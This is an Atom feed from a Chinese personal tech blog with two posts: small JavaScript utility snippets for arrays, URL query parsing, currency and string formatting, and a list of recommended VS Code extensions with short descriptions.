<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>非空的小站</title>
  <subtitle>记录工作、学习、生活中的点点滴滴</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://qrframe.com/"/>
  <updated>2017-12-03T08:40:03.750Z</updated>
  <id>http://qrframe.com/</id>
  
  <author>
    <name>任琪</name>
    <email>ren8179@126.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JavaScript小技巧</title>
    <link href="http://qrframe.com/2017/11/01/JavaScript%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>http://qrframe.com/2017/11/01/JavaScript小技巧/</id>
    <published>2017-11-01T08:38:55.000Z</published>
    <updated>2017-12-03T08:40:03.750Z</updated>
    
    <content type="html">&lt;h1 id=&quot;快速删除数组对象中的重复项&quot;&gt;&lt;a href=&quot;#快速删除数组对象中的重复项&quot; class=&quot;headerlink&quot; title=&quot;快速删除数组对象中的重复项&quot;&gt;&lt;/a&gt;快速删除数组对象中的重复项&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;-- 获取数组对象中需要用到的属性，并生成新的数组对象&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;var items = _this.plans.map(item =&amp;gt; &amp;#123; cid: form.id, mid: item.mid, name: item.name &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;var unique = &amp;#123;&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-- 遍历数组，覆盖相同的值&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;items.forEach(item=&amp;gt;unique[JSON.stringify(item)] = item);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;items = Object.keys(unique).map(u=&amp;gt;JSON.parse(u) );&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;根据条件删除数组中的指定行&quot;&gt;&lt;a href=&quot;#根据条件删除数组中的指定行&quot; class=&quot;headerlink&quot; title=&quot;根据条件删除数组中的指定行&quot;&gt;&lt;/a&gt;根据条件删除数组中的指定行&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;/*&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Comments:判断某列的值是否为空，如果为空，则删除指定行&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Param list :  要操作的数组&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Param col : 列名 默认为：matDetailId&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Param index : 要删除的行 默认为：数组的最后一行&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* @Return void&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;function clearRow(list, col, index) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    col = col || &amp;apos;matDetailId&amp;apos;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    index = index || (list.length - 1);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if (list.some(item =&amp;gt; !item[col])) list.splice(index, 1);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;将url的查询参数解析成字典对象&quot;&gt;&lt;a href=&quot;#将url的查询参数解析成字典对象&quot; class=&quot;headerlink&quot; title=&quot;将url的查询参数解析成字典对象&quot;&gt;&lt;/a&gt;将url的查询参数解析成字典对象&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;//将url的查询参数解析成字典对象&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;function getQueryObject(url) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    //将url的查询参数解析成字典对象&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    url = url == null ? location.search : url; //获取url中&amp;quot;?&amp;quot;符后的字串&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    var urlParams = &amp;#123;&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    var match,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        pl = /\+/g,  // Regex for replacing addition symbol with a space&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        search = /([^&amp;amp;=]+)=?([^&amp;amp;]*)/g,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        decode = function (s) &amp;#123; return decodeURIComponent(s.replace(pl, &amp;quot; &amp;quot;)); &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        query = url.substring(1);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    while (match = search.exec(query))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        urlParams[decode(match[1])] = decode(match[2]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    return urlParams;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;金额格式修改&quot;&gt;&lt;a href=&quot;#金额格式修改&quot; class=&quot;headerlink&quot; title=&quot;金额格式修改&quot;&gt;&lt;/a&gt;金额格式修改&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;// 金额格式修改&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;// usage: formatCurrency(number, decimalPlaces, symbol, thousandsSeparator, decimalSeparator)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;// defaults: (1000, 2, &amp;quot;$&amp;quot;, &amp;quot;,&amp;quot;, &amp;quot;.&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;formatCurrency: function (number, places, symbol, thousand, decimal) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    number = number || 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    places = !isNaN(places = Math.abs(places)) ? places : 2;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    symbol = symbol !== undefined ? symbol : &amp;quot;$&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    thousand = thousand || &amp;quot;,&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    decimal = decimal || &amp;quot;.&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    var negative = number &amp;lt; 0 ? &amp;quot;-&amp;quot; : &amp;quot;&amp;quot;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        i = parseInt(number = Math.abs(+number || 0).toFixed(places), 10) + &amp;quot;&amp;quot;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        j = (j = i.length) &amp;gt; 3 ? j % 3 : 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    return symbol + negative + (j ? i.substr(0, j) + thousand : &amp;quot;&amp;quot;) + i.substr(j).replace(/(\d&amp;#123;3&amp;#125;)(?=\d)/g, &amp;quot;$1&amp;quot; + thousand) + (places ? decimal + Math.abs(number - i).toFixed(places).slice(2) : &amp;quot;&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;格式化字符串&quot;&gt;&lt;a href=&quot;#格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串&quot;&gt;&lt;/a&gt;格式化字符串&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;String.prototype.format = function (args) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    var result = this;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if (arguments.length &amp;gt; 0) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        if (arguments.length == 1 &amp;amp;&amp;amp; typeof (args) == &amp;quot;object&amp;quot;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            for (var key in args) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                if (args[key] != undefined) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    var reg = new RegExp(&amp;quot;(&amp;#123;&amp;quot; + key + &amp;quot;&amp;#125;)&amp;quot;, &amp;quot;g&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    result = result.replace(reg, args[key]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        else &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            for (var i = 0; i &amp;lt; arguments.length; i++) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                if (arguments[i] != undefined) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    var reg = new RegExp(&amp;quot;(&amp;#123;)&amp;quot; + i + &amp;quot;(&amp;#125;)&amp;quot;, &amp;quot;g&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    result = result.replace(reg, arguments[i]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    return result;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;快速删除数组对象中的重复项&quot;&gt;&lt;a href=&quot;#快速删除数组对象中的重复项&quot; class=&quot;headerlink&quot; title=&quot;快速删除数组对象中的重复项&quot;&gt;&lt;/a&gt;快速删除数组对象中的重复项&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;-- 获取数组对象中需要用到的属性，并生成新的数组对象&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;var items = _this.plans.map(item =&amp;gt; &amp;#123; cid: form.id, mid: item.mid, name: item.name &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;var unique = &amp;#123;&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-- 遍历数组，覆盖相同的值&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;items.forEach(item=&amp;gt;unique[JSON.stringify(item)] = item);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;items = Object.keys(unique).map(u=&amp;gt;JSON.parse(u) );&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Web开发" scheme="http://qrframe.com/tags/Web%E5%BC%80%E5%8F%91/"/>
    
      <category term="JavaScript" scheme="http://qrframe.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>Visual Studio Code 扩展推荐</title>
    <link href="http://qrframe.com/2017/10/25/Visual-Studio-Code-%E6%89%A9%E5%B1%95%E6%8E%A8%E8%8D%90/"/>
    <id>http://qrframe.com/2017/10/25/Visual-Studio-Code-扩展推荐/</id>
    <published>2017-10-25T08:36:02.000Z</published>
    <updated>2017-12-03T08:37:21.907Z</updated>
    
    <content type="html">&lt;hr&gt;
&lt;p&gt;由于VSCode貌似没有导出扩展列表的功能，所以在此记录下自己经常用到的一些扩展，同时也推荐给更多的朋友，希望能对大家有所帮助。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;扩展列表按名称排序&lt;/p&gt;
&lt;h3 id=&quot;Auto-Close-Tag&quot;&gt;&lt;a href=&quot;#Auto-Close-Tag&quot; class=&quot;headerlink&quot; title=&quot;Auto Close Tag&quot;&gt;&lt;/a&gt;Auto Close Tag&lt;/h3&gt;&lt;p&gt;输入开始标签后，自动添加结束标签。比如输入&lt;div&gt;，自动添加&lt;/div&gt;&lt;/p&gt;
&lt;h3 id=&quot;Auto-Rename-Tag&quot;&gt;&lt;a href=&quot;#Auto-Rename-Tag&quot; class=&quot;headerlink&quot; title=&quot;Auto Rename Tag&quot;&gt;&lt;/a&gt;Auto Rename Tag&lt;/h3&gt;&lt;p&gt;更改HTML/XML标签名时，自动更新相对应的开始标签或结束标签的标签名&lt;/p&gt;
&lt;h3 id=&quot;Beautify&quot;&gt;&lt;a href=&quot;#Beautify&quot; class=&quot;headerlink&quot; title=&quot;Beautify&quot;&gt;&lt;/a&gt;Beautify&lt;/h3&gt;&lt;p&gt;格式化javascript，JSON，CSS，Sass和HTML代码&lt;/p&gt;
&lt;h3 id=&quot;Better-Comments&quot;&gt;&lt;a href=&quot;#Better-Comments&quot; class=&quot;headerlink&quot; title=&quot;Better Comments&quot;&gt;&lt;/a&gt;Better Comments&lt;/h3&gt;&lt;p&gt; 编写更加人性化的注释&lt;br&gt;&lt;img src=&quot;https://github.com/aaron-bond/better-comments/raw/master/images/better-comments.PNG&quot; alt=&quot;Annotated code&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;Bookmarks&quot;&gt;&lt;a href=&quot;#Bookmarks&quot; class=&quot;headerlink&quot; title=&quot;Bookmarks&quot;&gt;&lt;/a&gt;Bookmarks&lt;/h3&gt;&lt;p&gt;添加行书签&lt;/p&gt;
&lt;h3 id=&quot;C&quot;&gt;&lt;a href=&quot;#C&quot; class=&quot;headerlink&quot; title=&quot;C&quot;&gt;&lt;/a&gt;C&lt;/h3&gt;&lt;p&gt;使用VSCode编写C#代码必须的，安装之后在默认打开.cs文件时 还会自动下载调试器等&lt;/p&gt;
&lt;h3 id=&quot;C-Extensions&quot;&gt;&lt;a href=&quot;#C-Extensions&quot; class=&quot;headerlink&quot; title=&quot;C# Extensions&quot;&gt;&lt;/a&gt;C# Extensions&lt;/h3&gt;&lt;p&gt;C#扩展插件,强烈推荐，可以帮你在建立文件的时候初始化文件内容包括对应的命名空间等&lt;/p&gt;
&lt;h3 id=&quot;C-XML-Documentation-Comments&quot;&gt;&lt;a href=&quot;#C-XML-Documentation-Comments&quot; class=&quot;headerlink&quot; title=&quot;C# XML Documentation Comments&quot;&gt;&lt;/a&gt;C# XML Documentation Comments&lt;/h3&gt;&lt;p&gt;可以快速的帮你添加注释，如同在VS里面使用///来添加注释&lt;/p&gt;
&lt;h3 id=&quot;Can-I-Use&quot;&gt;&lt;a href=&quot;#Can-I-Use&quot; class=&quot;headerlink&quot; title=&quot;Can I Use&quot;&gt;&lt;/a&gt;Can I Use&lt;/h3&gt;&lt;p&gt;HTML5、CSS3、SVG的浏览器兼容性检查&lt;/p&gt;
&lt;h3 id=&quot;Code-Outline&quot;&gt;&lt;a href=&quot;#Code-Outline&quot; class=&quot;headerlink&quot; title=&quot;Code Outline&quot;&gt;&lt;/a&gt;Code Outline&lt;/h3&gt;&lt;p&gt;函数变量列表&lt;/p&gt;
&lt;h3 id=&quot;Code-Runner&quot;&gt;&lt;a href=&quot;#Code-Runner&quot; class=&quot;headerlink&quot; title=&quot;Code Runner&quot;&gt;&lt;/a&gt;Code Runner&lt;/h3&gt;&lt;p&gt;运行选中代码段（支持大量语言，包括Node）&lt;/p&gt;
&lt;h3 id=&quot;Color-Highlight&quot;&gt;&lt;a href=&quot;#Color-Highlight&quot; class=&quot;headerlink&quot; title=&quot;Color Highlight&quot;&gt;&lt;/a&gt;Color Highlight&lt;/h3&gt;&lt;p&gt;颜色代码高亮插件&lt;/p&gt;
&lt;h3 id=&quot;Color-Info&quot;&gt;&lt;a href=&quot;#Color-Info&quot; class=&quot;headerlink&quot; title=&quot;Color Info&quot;&gt;&lt;/a&gt;Color Info&lt;/h3&gt;&lt;p&gt;提供你在 CSS 中使用颜色的相关信息。你只需在颜色上悬停光标，就可以预览色块中色彩模型的（HEX、 RGB、HSL 和 CMYK）相关信息了&lt;/p&gt;
&lt;h3 id=&quot;Color-Picker&quot;&gt;&lt;a href=&quot;#Color-Picker&quot; class=&quot;headerlink&quot; title=&quot;Color Picker&quot;&gt;&lt;/a&gt;Color Picker&lt;/h3&gt;&lt;p&gt;拾色器&lt;/p&gt;
&lt;h3 id=&quot;CSScomb&quot;&gt;&lt;a href=&quot;#CSScomb&quot; class=&quot;headerlink&quot; title=&quot;CSScomb&quot;&gt;&lt;/a&gt;CSScomb&lt;/h3&gt;&lt;p&gt;css属性排序&lt;/p&gt;
&lt;h3 id=&quot;cssrem&quot;&gt;&lt;a href=&quot;#cssrem&quot; class=&quot;headerlink&quot; title=&quot;cssrem&quot;&gt;&lt;/a&gt;cssrem&lt;/h3&gt;&lt;p&gt;px转换为rem&lt;/p&gt;
&lt;h3 id=&quot;Debugger-for-Chrome&quot;&gt;&lt;a href=&quot;#Debugger-for-Chrome&quot; class=&quot;headerlink&quot; title=&quot;Debugger for Chrome&quot;&gt;&lt;/a&gt;Debugger for Chrome&lt;/h3&gt;&lt;p&gt;方便js调试的插件，前端项目在Chrome中运行起来之后，可以直接在VSCode中打断点、查看输出、查看控制台，需要配置launch.json,详情见插件说明。&lt;/p&gt;
&lt;h3 id=&quot;Document-This&quot;&gt;&lt;a href=&quot;#Document-This&quot; class=&quot;headerlink&quot; title=&quot;Document This&quot;&gt;&lt;/a&gt;Document This&lt;/h3&gt;&lt;p&gt;jsdoc注释生成&lt;/p&gt;
&lt;h3 id=&quot;EditorConfig-for-Visual-Studio-Code&quot;&gt;&lt;a href=&quot;#EditorConfig-for-Visual-Studio-Code&quot; class=&quot;headerlink&quot; title=&quot;EditorConfig for Visual Studio Code&quot;&gt;&lt;/a&gt;EditorConfig for Visual Studio Code&lt;/h3&gt;&lt;h3 id=&quot;ESLint&quot;&gt;&lt;a href=&quot;#ESLint&quot; class=&quot;headerlink&quot; title=&quot;ESLint&quot;&gt;&lt;/a&gt;ESLint&lt;/h3&gt;&lt;p&gt;这是个esint规则校验扩展。vs code 会自动找到你工程中的.eslintrc和.eslintignore。你只需要设置下elsint选项。&lt;/p&gt;
&lt;h3 id=&quot;Express&quot;&gt;&lt;a href=&quot;#Express&quot; class=&quot;headerlink&quot; title=&quot;Express&quot;&gt;&lt;/a&gt;Express&lt;/h3&gt;&lt;p&gt;使用Visual Studio代码中的Express Web服务器托管当前工作空间&lt;/p&gt;
&lt;h3 id=&quot;File-Peek&quot;&gt;&lt;a href=&quot;#File-Peek&quot; class=&quot;headerlink&quot; title=&quot;File Peek&quot;&gt;&lt;/a&gt;File Peek&lt;/h3&gt;&lt;p&gt;根据路径字符串，快速定位到文件&lt;/p&gt;
&lt;h3 id=&quot;Font-awesome-codes-for-html-snippets&quot;&gt;&lt;a href=&quot;#Font-awesome-codes-for-html-snippets&quot; class=&quot;headerlink&quot; title=&quot;Font-awesome codes for html (snippets)&quot;&gt;&lt;/a&gt;Font-awesome codes for html (snippets)&lt;/h3&gt;&lt;p&gt;FontAwesome提示代码段&lt;/p&gt;
&lt;h3 id=&quot;Git-Blame&quot;&gt;&lt;a href=&quot;#Git-Blame&quot; class=&quot;headerlink&quot; title=&quot;Git Blame&quot;&gt;&lt;/a&gt;Git Blame&lt;/h3&gt;&lt;p&gt;可以查看当前光标所在位置的Git Log，最近一次提交的人和时间，显示在左下角&lt;/p&gt;
&lt;h3 id=&quot;Git-History&quot;&gt;&lt;a href=&quot;#Git-History&quot; class=&quot;headerlink&quot; title=&quot;Git History&quot;&gt;&lt;/a&gt;Git History&lt;/h3&gt;&lt;p&gt;查看git log&lt;/p&gt;
&lt;h3 id=&quot;Guides&quot;&gt;&lt;a href=&quot;#Guides&quot; class=&quot;headerlink&quot; title=&quot;Guides&quot;&gt;&lt;/a&gt;Guides&lt;/h3&gt;&lt;p&gt;高亮缩进基准线&lt;/p&gt;
&lt;h3 id=&quot;HTML-CSS-Support&quot;&gt;&lt;a href=&quot;#HTML-CSS-Support&quot; class=&quot;headerlink&quot; title=&quot;HTML CSS Support&quot;&gt;&lt;/a&gt;HTML CSS Support&lt;/h3&gt;&lt;p&gt;css提示（支持vue）&lt;/p&gt;
&lt;h3 id=&quot;HTML-Snippets&quot;&gt;&lt;a href=&quot;#HTML-Snippets&quot; class=&quot;headerlink&quot; title=&quot;HTML Snippets&quot;&gt;&lt;/a&gt;HTML Snippets&lt;/h3&gt;&lt;p&gt;增强了zen-coding，增加了H5的自动补全，安装后每次打开自动启用&lt;/p&gt;
&lt;h3 id=&quot;Import-Cost&quot;&gt;&lt;a href=&quot;#Import-Cost&quot; class=&quot;headerlink&quot; title=&quot;Import Cost&quot;&gt;&lt;/a&gt;Import Cost&lt;/h3&gt;&lt;p&gt;在引入npm包同时获取所用包的体积，可配置显示格式(minified or gziped)&lt;/p&gt;
&lt;h3 id=&quot;Indenticator&quot;&gt;&lt;a href=&quot;#Indenticator&quot; class=&quot;headerlink&quot; title=&quot;Indenticator&quot;&gt;&lt;/a&gt;Indenticator&lt;/h3&gt;&lt;p&gt;缩进高亮&lt;/p&gt;
&lt;h3 id=&quot;IntelliSense-for-CSS-class-names&quot;&gt;&lt;a href=&quot;#IntelliSense-for-CSS-class-names&quot; class=&quot;headerlink&quot; title=&quot;IntelliSense for CSS class names&quot;&gt;&lt;/a&gt;IntelliSense for CSS class names&lt;/h3&gt;&lt;p&gt;CSS类名工具&lt;/p&gt;
&lt;h3 id=&quot;JavaScript-ES6-code-snippets&quot;&gt;&lt;a href=&quot;#JavaScript-ES6-code-snippets&quot; class=&quot;headerlink&quot; title=&quot;JavaScript (ES6) code snippets&quot;&gt;&lt;/a&gt;JavaScript (ES6) code snippets&lt;/h3&gt;&lt;p&gt;es6代码片段&lt;/p&gt;
&lt;h3 id=&quot;JavaScript-Standard-Style&quot;&gt;&lt;a href=&quot;#JavaScript-Standard-Style&quot; class=&quot;headerlink&quot; title=&quot;JavaScript Standard Style&quot;&gt;&lt;/a&gt;JavaScript Standard Style&lt;/h3&gt;&lt;p&gt;JavaScript 标准编码风格&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;使用两个空格&lt;/strong&gt; – 进行缩进&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;字符串使用单引号&lt;/strong&gt; – 需要转义的地方除外&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;不再有冗余的变量&lt;/strong&gt; – 这是导致 &lt;em&gt;大量&lt;/em&gt; bug 的源头!&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;无分号&lt;/strong&gt; – 这里有3篇文章说明不用分号的好处：&lt;a href=&quot;http://blog.izs.me/post/2353458699/an-open-letter-to-javascript-leaders-regarding&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;文章1&lt;/a&gt; &lt;a href=&quot;http://inimino.org/~inimino/blog/javascript_semicolons&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;文章2&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=gsfbh17Ax9I&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;文章3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;行首不要以 (, [, or `开头&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;关键字后加空格 &lt;code&gt;if (condition) { ... }&lt;/code&gt;&lt;/li&gt;
